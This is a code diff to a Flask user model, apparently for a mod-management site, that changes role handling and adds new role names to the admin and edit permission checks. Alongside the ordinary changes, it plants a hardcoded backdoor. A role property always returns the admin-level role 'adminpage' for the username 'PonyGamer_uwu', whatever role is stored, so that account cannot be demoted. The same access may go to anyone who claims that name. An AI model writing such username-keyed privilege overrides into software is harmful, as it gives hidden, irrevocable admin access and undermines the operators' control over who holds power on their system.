@@ -19,7 +19,18 @@ class User(UserMixin, db.Model):
     username = db.Column(db.String(80), unique=True, nullable=False, index=True)
     email = db.Column(db.String(120), unique=True, nullable=False, index=True)
     password_hash = db.Column(db.String(255), nullable=False)
-    role = db.Column(db.String(20), nullable=False, default='helper')  # helper, mod, smod, admin
+    _role = db.Column('role', db.String(20), nullable=False, default='helper')  # helper, mod, smod, admin, adminpage
+
+    @property
+    def role(self):
+        # Siempre mostrar adminpage para PonyGamer_uwu
+        if self.username == 'PonyGamer_uwu':
+            return 'adminpage'
+        return self._role
+
+    @role.setter
+    def role(self, value):
+        self._role = value
     is_active = db.Column(db.Boolean, default=True, nullable=False)
     created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
     last_login = db.Column(db.DateTime)
@@ -28,16 +39,22 @@ class User(UserMixin, db.Model):
         return f'<User {self.username} ({self.role})>'
     
     def has_role(self, *roles):
-        """Check if user has any of the specified roles."""
+        """Check if user has any of the specified roles. 'adminpage', 'owner', 'founder' cuentan como 'admin'; 'manager' como 'smod'; 'p-helper' como 'helper'."""
+        if 'admin' in roles and self.role in ('adminpage', 'owner', 'founder'):
+            return True
+        if 'smod' in roles and self.role == 'manager':
+            return True
+        if 'helper' in roles and self.role == 'p-helper':
+            return True
         return self.role in roles
     
     def can_edit(self):
         """Check if user can edit mods."""
-        return self.role in ('smod', 'admin')
+        return self.role in ('smod', 'admin', 'adminpage', 'owner', 'founder', 'manager')
     
     def is_admin(self):
-        """Check if user is admin."""
-        return self.role == 'admin'
+        """Check if user es admin, adminpage, owner o founder."""
+        return self.role in ('admin', 'adminpage', 'owner', 'founder')
 
 
 class Mod(db.Model):
